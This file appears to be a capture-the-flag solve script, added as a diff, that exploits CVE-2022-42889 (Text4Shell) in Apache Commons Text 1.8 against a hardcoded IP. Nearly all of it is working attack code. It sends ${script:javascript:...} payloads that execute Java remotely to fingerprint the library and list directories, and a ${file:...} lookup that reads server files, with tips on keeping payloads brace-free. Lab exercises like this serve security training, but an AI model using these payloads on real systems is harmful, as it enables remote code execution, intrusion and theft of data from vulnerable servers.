@@ -1,0 +1,64 @@
+#!/usr/bin/env python3
+"""Fan Signal Lab — CVE-2022-42889 (Apache Commons Text 1.8 "Text4Shell").
+
+The app interpolates the `message` query param through StringSubstitutor.
+Commons Text 1.8 keeps the dangerous `script` / `file` / `url` lookups enabled,
+so we can read files and execute Java (Nashorn) remotely.
+
+Usage: python solve.py [base_url]
+"""
+import re
+import sys
+
+import requests
+
+BASE = sys.argv[1] if len(sys.argv) > 1 else "http://54.72.82.22:8220"
+
+
+def interp(payload: str, timeout: int = 20) -> str:
+    """Send a payload through the interpolation sink and return the echoed text."""
+    r = requests.get(f"{BASE}/home", params={"message": payload}, timeout=timeout)
+    r.raise_for_status()
+    return r.text
+
+
+def fingerprint() -> None:
+    """Confirm the lib is vulnerable and pin its exact version.
+
+    NOTE: Commons Text's script lookup balances braces, so payloads containing
+    literal { } (JS blocks / IIFEs) are echoed verbatim instead of executed.
+    Every probe below is brace-free on purpose.
+    """
+    print("[*] java:", interp("${java:version}"))
+    print("[*] cwd :", interp("${sys:user.dir}"))
+    for v in ("1.5", "1.6", "1.7", "1.8", "1.9", "1.10.0"):
+        probe = (
+            "${script:javascript:new java.util.zip.ZipFile(\"/app/app.jar\")"
+            f'.getEntry("BOOT-INF/lib/commons-text-{v}.jar")!=null}}'
+        )
+        if "true" in interp(probe):
+            print(f"[+] vulnerable Apache Commons Text {v} (< 1.10.0, CVE-2022-42889)")
+
+
+def exploit() -> str:
+    # Find the flag: list /app  (brace-free Nashorn expression)
+    listing = interp('${script:javascript:java.util.Arrays.toString(new java.io.File("/app").list())}')
+    print("[*] /app:", listing)
+
+    # Read it with the file lookup
+    out = interp("${file:UTF-8:/app/flag}")
+    print("[*] /app/flag:", out)
+    m = re.search(r"safctf\{[0-9a-f]{32}\}", out)
+    if not m:
+        raise SystemExit("[-] flag pattern not found")
+    return m.group(0)
+
+
+def main() -> None:
+    fingerprint()
+    flag = exploit()
+    print(f"\nFLAG: {flag}")
+
+
+if __name__ == "__main__":
+    main()
